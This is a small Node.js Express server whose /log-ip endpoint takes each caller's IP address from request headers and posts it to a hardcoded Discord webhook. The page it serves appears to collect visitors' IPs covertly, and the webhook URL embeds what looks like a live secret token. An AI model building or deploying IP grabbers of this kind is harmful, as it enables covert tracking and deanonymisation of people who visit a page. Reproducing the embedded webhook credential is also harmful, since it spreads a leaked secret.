const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON requests
app.use(express.json());

// Serve the static HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint to log the IP address
app.post('/log-ip', (req, res) => {
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const webhookUrl = 'https://discord.com/api/webhooks/1289959208032407614/_ziKdv8iCD3NDDCRxVJGF3RiphkWdOr0HbvmjdnDrrH96iqd0TCv_Wd3pqtvKKMQVKWV'; // Your actual webhook URL
    const data = {
        content: `IP Logged: ${ipAddress}`
    };

    // Send IP address to the webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            console.log(`IP logged: ${ipAddress}`);
            res.status(200).send('IP logged successfully');
        } else {
            res.status(500).send('Error logging IP');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        res.status(500).send('Error logging IP');
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
